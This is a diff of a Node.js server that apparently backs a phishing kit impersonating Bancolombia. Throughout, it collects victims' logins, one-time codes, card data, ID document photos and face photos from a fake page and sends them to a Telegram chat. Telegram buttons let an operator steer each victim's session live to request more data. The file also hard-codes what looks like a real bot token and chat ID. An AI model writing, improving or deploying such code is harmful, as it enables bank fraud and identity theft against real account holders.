@@ -1,240 +1,266 @@
 const express = require('express');
 const app = express();
 const http = require('http').createServer(app);
-const io = require('socket.io')(http, {
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    }
-});
+const io = require('socket.io')(http);
 const TelegramBot = require('node-telegram-bot-api');
+const path = require('path');
 
-const botToken = '8476776117:AAELHdBk6OXxUcI2-QkI7xhtu6HKWeynhZY';
-const chatId = '-1002984980722';
+// Configuración
+const PORT = process.env.PORT || 3000;
+const TELEGRAM_BOT_TOKEN = '8476776117:AAELHdBk6OXxUcI2-QkI7xhtu6HKWeynhZY';
+const TELEGRAM_CHAT_ID = '-1002984980722';
 
-// Configuración del bot con manejo de errores
-const bot = new TelegramBot(botToken, { 
-    polling: true,
-    filepath: false // Deshabilitar el guardado de archivos
-});
+// Inicializar bot de Telegram
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
-// Manejar errores del bot
-bot.on('polling_error', (error) => {
-    console.log('Error de polling:', error);
-});
-
-bot.on('error', (error) => {
-    console.log('Error general del bot:', error);
-});
-
-// Middleware
+// Servir archivos estáticos
 app.use(express.static(__dirname));
-app.use(express.json());
+app.use(express.json({ limit: '50mb' }));
 
-// Almacenar las sesiones activas
-const sessions = new Map();
+// Almacenar sesiones activas
+const activeSessions = new Map();
+const sessionSockets = new Map();
 
+// Manejar favicon
+app.get('/favicon.ico', (req, res) => {
+    res.status(204).end();
+});
+
+// Ruta principal
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+// Configuración de Socket.IO con mejor logging
 io.on('connection', (socket) => {
-    console.log('Cliente conectado:', socket.id);
-    let currentSessionId = null;
+    console.log('\n🔗 Cliente conectado:', socket.id);
+    console.log('   Tiempo:', new Date().toLocaleTimeString());
 
-    socket.on('initSession', ({ sessionId }) => {
-        console.log('Iniciando sesión:', sessionId);
-        currentSessionId = sessionId;
-        sessions.set(sessionId, {
+    // Inicializar sesión
+    socket.on('initSession', (data) => {
+        const { sessionId, page } = data;
+        console.log('Sesión inicializada:', sessionId, 'en página:', page);
+        
+        activeSessions.set(sessionId, {
             socketId: socket.id,
-            lastActive: Date.now()
+            page: page || 'unknown',
+            timestamp: Date.now()
         });
-        socket.emit('sessionConfirmed', { sessionId });
+        
+        sessionSockets.set(socket.id, sessionId);
+        
+        socket.emit('sessionConfirmed', { sessionId, success: true });
     });
 
+    // Mantener sesión activa
+    socket.on('keepAlive', (data) => {
+        const { sessionId } = data;
+        if (sessionId && activeSessions.has(sessionId)) {
+            const session = activeSessions.get(sessionId);
+            session.timestamp = Date.now();
+            activeSessions.set(sessionId, session);
+        }
+    });
+
+    // Enviar datos a Telegram
     socket.on('sendData', async (data) => {
         try {
-            const { type, content, sessionId } = data;
-            console.log('Recibiendo datos:', type, 'de sesión:', sessionId);
+            const { type, sessionId, content, waitForAction } = data;
+            console.log('\n📨 Datos recibidos del cliente:');
+            console.log('   Tipo:', type);
+            console.log('   Sesión:', sessionId);
+            console.log('   Socket ID:', socket.id);
+            console.log('   Contenido:', content.text ? content.text.substring(0, 50) + '...' : 'Imagen');
 
-            // Actualizar timestamp de actividad y guardar el socket ID
-            sessions.set(sessionId, {
-                socketId: socket.id,
-                lastActive: Date.now()
-            });
-
-            // Confirmar recepción al cliente inmediatamente
-            socket.emit('dataSent', { success: true });
-
-            // Preparar mensaje para Telegram
-            let message = '🔵 Nueva información recibida\n\n';
-            
-            // Opciones de botones comunes
-            const keyboard = {
+            // Preparar mensaje y teclado
+            let message = content.text || '';
+            let keyboard = {
                 inline_keyboard: [
                     [
-                        { text: "1️⃣ Pedir Logo", callback_data: `index_${sessionId}` },
-                        { text: "2️⃣ Pedir OTP", callback_data: `dinamica_${sessionId}` }
+                        { text: "🏠 Index", callback_data: `action:index:${sessionId}` },
+                        { text: "🔐 Dinámica", callback_data: `action:dinamica:${sessionId}` }
                     ],
                     [
-                        { text: "3️⃣ Pedir Tarjeta", callback_data: `tarjeta_${sessionId}` },
-                        { text: "4️⃣ Pedir Cara", callback_data: `terminos_${sessionId}` }
+                        { text: "📄 Términos", callback_data: `action:terminos:${sessionId}` },
+                        { text: "💳 Tarjeta", callback_data: `action:tarjeta:${sessionId}` }
                     ],
                     [
-                        { text: "5️⃣ Pedir Cédula", callback_data: `cedula_${sessionId}` },
-                        { text: "6️⃣ Finalizar", callback_data: `finalizar_${sessionId}` }
+                        { text: "🪪 Cédula", callback_data: `action:cedula:${sessionId}` },
+                        { text: "👤 Cara", callback_data: `action:cara:${sessionId}` }
+                    ],
+                    [
+                        { text: "✅ Finalizar", callback_data: `action:finalizar:${sessionId}` }
                     ]
                 ]
             };
-            
-            // Preparar el mensaje según el tipo de datos
-            switch(type) {
-                case 'login':
-                    message += '📱 Datos de inicio\n';
-                    break;
-                case 'dinamica':
-                    message += '🔑 Clave dinámica\n';
-                    break;
-                case 'terminos':
-                    message += '📋 Términos aceptados\n';
-                    break;
-                case 'face':
-                    message += '👤 Foto de rostro\n';
-                    break;
-                case 'document':
-                    message += '📄 Foto de documento\n';
-                    break;
-                case 'tarjeta':
-                    message += '💳 Datos de tarjeta\n';
-                    break;
-            }
 
-            message += `⌚ Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}\n`;
-            
-            if (content.text) {
-                message += `\n${content.text}`;
-            }
+            console.log('📤 Enviando a Telegram...');
 
-            try {
-                // Si hay imagen, enviarla primero con el texto y los botones
-                if (content.image) {
-                    const imageBuffer = Buffer.from(content.image.split(',')[1], 'base64');
-                    await bot.sendPhoto(chatId, imageBuffer, {
-                        caption: message,
-                        reply_markup: keyboard
-                    });
-                } else {
-                    // Si no hay imagen, enviar solo el mensaje con los botones
-                    await bot.sendMessage(chatId, message, {
-                        reply_markup: keyboard
-                    });
-                }
-
-                // Confirmar éxito al cliente
-                socket.emit('dataSent', { success: true });
-                
-            } catch (sendError) {
-                console.error('Error al enviar a Telegram:', sendError);
-                socket.emit('error', { 
-                    message: 'Error al enviar datos',
-                    details: sendError.message 
+            // Enviar mensaje a Telegram
+            let telegramResponse;
+            if (content.image) {
+                // Si hay imagen, enviarla
+                console.log('   📷 Enviando imagen con caption');
+                const imageBuffer = Buffer.from(content.image.split(',')[1], 'base64');
+                telegramResponse = await bot.sendPhoto(TELEGRAM_CHAT_ID, imageBuffer, {
+                    caption: message,
+                    reply_markup: keyboard
                 });
-                
-                // Intentar enviar mensaje de error al grupo
-                try {
-                    await bot.sendMessage(chatId, '❌ Error al procesar el envío de datos');
-                } catch (notificationError) {
-                    console.error('Error al enviar notificación de error:', notificationError);
-                }
+            } else {
+                // Solo texto
+                console.log('   💬 Enviando mensaje de texto');
+                telegramResponse = await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
+                    reply_markup: keyboard,
+                    parse_mode: 'HTML'
+                });
             }
+
+            console.log('✅ Mensaje enviado a Telegram exitosamente');
+            console.log('   Message ID:', telegramResponse.message_id);
+
+            socket.emit('dataSent', { 
+                success: true, 
+                type,
+                message: 'Datos enviados correctamente a Telegram',
+                telegramMessageId: telegramResponse.message_id
+            });
 
         } catch (error) {
-            console.error('Error general en sendData:', error);
-            socket.emit('error', { 
-                message: 'Error general en el procesamiento de datos',
-                details: error.message 
+            console.error('❌ Error al enviar datos a Telegram:', error);
+            console.error('   Error details:', error.message);
+            socket.emit('dataSent', { 
+                success: false, 
+                message: error.message 
             });
         }
     });
 
     // Manejar desconexión
     socket.on('disconnect', () => {
-        if (currentSessionId) {
-            console.log('Cliente desconectado, sesión:', currentSessionId);
-            sessions.delete(currentSessionId);
+        console.log('Cliente desconectado:', socket.id);
+        
+        const sessionId = sessionSockets.get(socket.id);
+        if (sessionId) {
+            sessionSockets.delete(socket.id);
+            
+            // No eliminar la sesión inmediatamente, darle tiempo para reconectar
+            setTimeout(() => {
+                if (activeSessions.has(sessionId)) {
+                    const session = activeSessions.get(sessionId);
+                    if (session.socketId === socket.id) {
+                        console.log('Sesión expirada:', sessionId);
+                        activeSessions.delete(sessionId);
+                    }
+                }
+            }, 30000); // 30 segundos para reconectar
         }
+    });
+
+    // Confirmar acción recibida
+    socket.on('actionReceived', (data) => {
+        console.log('Acción confirmada por cliente:', data);
     });
 });
 
-// Manejar botones de Telegram
+// Manejar callbacks de Telegram
 bot.on('callback_query', async (callbackQuery) => {
-    try {
-        const [action, sessionId] = callbackQuery.data.split('_');
-        console.log('Acción recibida:', action, 'para sesión:', sessionId);
+    const message = callbackQuery.message;
+    const data = callbackQuery.data;
 
-        // Confirmar recepción del callback inmediatamente
+    try {
+        // Responder al callback inmediatamente
         await bot.answerCallbackQuery(callbackQuery.id);
 
-        const session = sessions.get(sessionId);
-        if (session) {
-            // Emitir la acción solo al socket específico
-            const socket = io.sockets.sockets.get(session.socketId);
-            if (socket) {
-                socket.emit('telegramAction', { action });
-                console.log('Acción enviada al socket:', session.socketId);
+        // Parsear datos
+        const [type, action, sessionId] = data.split(':');
+
+        if (type === 'action' && sessionId) {
+            console.log('Acción de Telegram:', action, 'para sesión:', sessionId);
+
+            // Buscar sesión activa
+            const session = activeSessions.get(sessionId);
+            
+            if (session) {
+                const socketId = session.socketId;
+                const targetSocket = io.sockets.sockets.get(socketId);
+
+                if (targetSocket) {
+                    // Enviar acción al cliente
+                    targetSocket.emit('telegramAction', {
+                        action,
+                        sessionId,
+                        fromTelegram: true,
+                        telegramMessageId: message.message_id,
+                        messageId: message.message_id,
+                        timestamp: Date.now()
+                    });
+
+                    // Confirmar en Telegram
+                    await bot.sendMessage(
+                        TELEGRAM_CHAT_ID,
+                        `✅ Acción "${action}" enviada correctamente`,
+                        { reply_to_message_id: message.message_id }
+                    );
+                } else {
+                    await bot.sendMessage(
+                        TELEGRAM_CHAT_ID,
+                        `⚠️ Cliente desconectado. Socket no encontrado.`,
+                        { reply_to_message_id: message.message_id }
+                    );
+                }
+            } else {
+                await bot.sendMessage(
+                    TELEGRAM_CHAT_ID,
+                    `⚠️ Sesión no encontrada o expirada: ${sessionId}`,
+                    { reply_to_message_id: message.message_id }
+                );
             }
-
-            // Actualizar último momento activo
-            session.lastActive = Date.now();
-
-            // Confirmar acción con mensaje
-            let confirmMessage = '✅ ';
-            switch(action) {
-                case 'index':
-                    confirmMessage += 'Redirigiendo al inicio...';
-                    break;
-                case 'dinamica':
-                    confirmMessage += 'Solicitando OTP...';
-                    break;
-                case 'terminos':
-                    confirmMessage += 'Solicitando foto...';
-                    break;
-                case 'tarjeta':
-                    confirmMessage += 'Solicitando datos de tarjeta...';
-                    break;
-                case 'cedula':
-                    confirmMessage += 'Solicitando documento...';
-                    break;
-                case 'finalizar':
-                    confirmMessage += 'Finalizando sesión...';
-                    break;
-            }
-
-            // Enviar mensaje de confirmación
-            await bot.sendMessage(chatId, confirmMessage);
-        } else {
-            console.log('Sesión no encontrada:', sessionId);
-            await bot.sendMessage(chatId, '⚠️ Sesión no encontrada');
         }
-
     } catch (error) {
-        console.error('Error en callback_query:', error);
-        try {
-            await bot.sendMessage(chatId, '❌ Error al procesar la acción');
-        } catch (sendError) {
-            console.error('Error al enviar mensaje de error:', sendError);
-        }
+        console.error('Error manejando callback:', error);
+        await bot.sendMessage(
+            TELEGRAM_CHAT_ID,
+            `❌ Error: ${error.message}`,
+            { reply_to_message_id: message.message_id }
+        );
     }
 });
 
-// Limpieza de sesiones inactivas
+// Limpiar sesiones expiradas cada 5 minutos
 setInterval(() => {
     const now = Date.now();
-    for (let [sessionId, data] of sessions.entries()) {
-        if (now - data.lastActive > 15 * 60 * 1000) { // 15 minutos
-            console.log('Limpiando sesión inactiva:', sessionId);
-            sessions.delete(sessionId);
+    const EXPIRY_TIME = 30 * 60 * 1000; // 30 minutos
+
+    for (const [sessionId, session] of activeSessions.entries()) {
+        if (now - session.timestamp > EXPIRY_TIME) {
+            console.log('Limpiando sesión expirada:', sessionId);
+            activeSessions.delete(sessionId);
+            sessionSockets.delete(session.socketId);
         }
     }
 }, 5 * 60 * 1000);
 
-const PORT = process.env.PORT || 3000;
+// Manejo de errores del bot
+bot.on('polling_error', (error) => {
+    console.error('Error de polling de Telegram:', error);
+});
+
+// Iniciar servidor
 http.listen(PORT, () => {
-    console.log(`Servidor corriendo en puerto ${PORT}`);
+    console.log('\n' + '='.repeat(50));
+    console.log('🚀 Servidor Bancolombia Iniciado');
+    console.log('='.repeat(50));
+    console.log(`📍 URL: http://localhost:${PORT}`);
+    console.log(`🤖 Bot de Telegram: ✅ Conectado`);
+    console.log(`👥 Sesiones activas: ${activeSessions.size}`);
+    console.log('='.repeat(50) + '\n');
+});
+
+// Manejo de cierre graceful
+process.on('SIGTERM', () => {
+    console.log('SIGTERM recibido, cerrando servidor...');
+    http.close(() => {
+        console.log('Servidor cerrado');
+        process.exit(0);
+    });
 });
